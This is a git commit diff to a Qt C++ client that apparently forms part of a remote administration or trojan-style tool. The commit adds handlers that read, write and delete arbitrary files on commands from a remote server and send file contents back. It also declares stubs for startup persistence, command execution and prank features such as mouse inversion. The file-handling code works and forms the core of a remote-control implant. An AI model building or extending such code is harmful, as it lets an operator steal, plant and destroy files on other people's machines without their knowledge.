d98cab3911ec9d043d5216e97cd2e476107e7a0f
blanzeanudoru <blanzeanu.doru@gmail.com>
2018-04-15 00:26:45 +0300

    File Handling functionality works
    Signed-off-by: blanzeanudoru <blanzeanu.doru@gmail.com>

--- QClient/qclient.cpp
+++ QClient/qclient.cpp
@@ -28,55 +28,82 @@ void QClient::connected()
 
 void QClient::disconnected()
 {
-
+	qDebug() << "DISCONNECTED";
 }
 
 void QClient::readyRead()
 {
 	if (sock->bytesAvailable())
 	{
-		QByteArray data = sock->readAll();
+		//read size of package then the JSON object
+		int size = sock->read(sizeof(int)).toInt();
+		QByteArray data = sock->read(size);
 		QJsonDocument doc = QJsonDocument::fromJson(data);
 		QJsonObject resp;
 		qDebug() << data;
 		if (doc.isObject())
 		{
 			QJsonObject obj = doc.object();
-			if (obj.contains("Id"))
+			if (obj.contains("Id") && obj.contains("Parameters"))
 			{
 				int id = obj.value("Id").toInt();
 				QString response;
 				switch ((Commands)id)
 				{
 				case Commands::CmdInjection:
+				{
 					response = "CmdInjection";
 					break;
+				}
 				case Commands::ExecProcess:
+				{
 					response = "ExecProcess";
 					break;
+				}
 				case Commands::CreateFile:
-					response = "CreateFile";
-					break;
-				case Commands::ReadFile:
-					response = "ReadFile";
-					break;
-				case Commands::DeleteFile:
-					response = "DeleteFile";
-					break;
-				case Commands::MouseInvert:
-					response = "MouseInvert";
-					break;
-				case Commands::DisplayRotate:
-					response = "DisplayRotate";
-					break;
-				case Commands::OsMessage:
-					response = "OsMessage";
-					break;
-				default:
-					response = "UNKNOWN COMMAND";
+				{
+					QJsonArray params = obj.value("Parameters").toArray();
+					response = writeFile(params[0].toString(), params[1].toString()) ? "SUCCESS" : "FAILED";
 					break;
 				}
+				case Commands::ReadFile:
+				{
+					QString fileName = obj.value("Parameters").toString();
+					response = readFile(fileName);
+					break;
+				}
+				case Commands::DeleteFile:
+				{
+					QString fileName = obj.value("Parameters").toString();
+					response = deleteFile(fileName) ? "SUCCESS" : "FAILED";
+					break;
+				}
+				case Commands::MouseInvert:
+				{
+					response = "MouseInvert";
+					break;
+				}
+				case Commands::DisplayRotate:
+				{
+					response = "DisplayRotate";
+					break;
+				}
+				case Commands::OsMessage:
+				{
+					response = "OsMessage";
+					break;
+				}
+				default:
+				{
+					response = "UNKNOWN COMMAND";
+				}
+				}
 				QJsonValue val = response;
+				resp.insert("response", val);
+			}
+			else
+			{
+				QJsonValue val = "Invalid Format. 'Id' key and 'Parameters' key";
 				resp.insert("response", val);
 			}
 		}
@@ -85,11 +112,82 @@ void QClient::readyRead()
 			QJsonValue val = "Invalid Format. Explected JSON";
 			resp.insert("response", val);
 		}
-		QJsonDocument docToSend(resp);
-		QByteArray a = docToSend.toJson();
-		qDebug() << a;
-		sock->write(a);
+		QByteArray dataToSend = (QJsonDocument(resp)).toJson();
+		qDebug() << dataToSend;
+		sendData(dataToSend);
+		//sock->flush();
 	}
+}
+
+
+void QClient::addStartup()
+{
+
+}
+
+QString QClient::startProcess(const QString &proc)
+{
+	return QString();
+}
+
+QString QClient::runCmdCommand(const QString &cmd)
+{
+	return QString();
+}
+
+QString QClient::readFile(const QString &fileName)
+{
+	QFile f(fileName);
+	if (!f.open(QFile::ReadOnly | QFile::Text))
+	{
+		return QString("CANNOT OPEN FILE ") + fileName;
+	}
+	QTextStream in(&f);
+	QString content = in.readAll();
+	f.close();
+	return content;
+}
+
+bool QClient::writeFile(const QString &fileName, const QString &text)
+{
+	QFile f(fileName);
+	if (!f.open(QFile::WriteOnly | QFile::Text))
+	{
+		return false;
+	}
+	QTextStream stream(&f);
+	stream << text;
+	f.close();
+	return true;
+}
+
+bool QClient::deleteFile(const QString &fileName)
+{
+	QFile file(fileName);
+	file.remove();
+	return !file.exists();
+}
+
+void QClient::toggleInvertMouse()
+{
+
+}
+
+void QClient::rotateDisplay()
+{
+
+}
+
+void QClient::message(const QString &)
+{
+
+}
+
+void QClient::sendData(const QByteArray &data)
+{
+	sock->write(QByteArray::number(data.size()));
+	sock->write(data);
+	sock->waitForBytesWritten();
 }
 
 QClient::~QClient()
--- QClient/qclient.h
+++ QClient/qclient.h
@@ -5,6 +5,8 @@
 #include <QTcpSocket>
 #include <QJsonDocument>
 #include <QJsonObject>
+#include <QFile>
+#include <QJsonArray>
 
 class QClient : public QObject
 {
@@ -23,6 +25,22 @@ public:
 		OsMessage = 7,
 		GetFiles = 8,
 	};
+
+	//Modify registers
+	void addStartup();
+	//Process Execution
+	QString startProcess(const QString &);
+	QString runCmdCommand(const QString &);
+	//File Handling
+	QString readFile(const QString &);
+	bool writeFile(const QString &, const QString &);
+	bool deleteFile(const QString &);
+	//Funny stuff
+	void toggleInvertMouse();
+	void rotateDisplay();
+	void message(const QString &);
+
+	void sendData(const QByteArray &);
 
 signals:
 
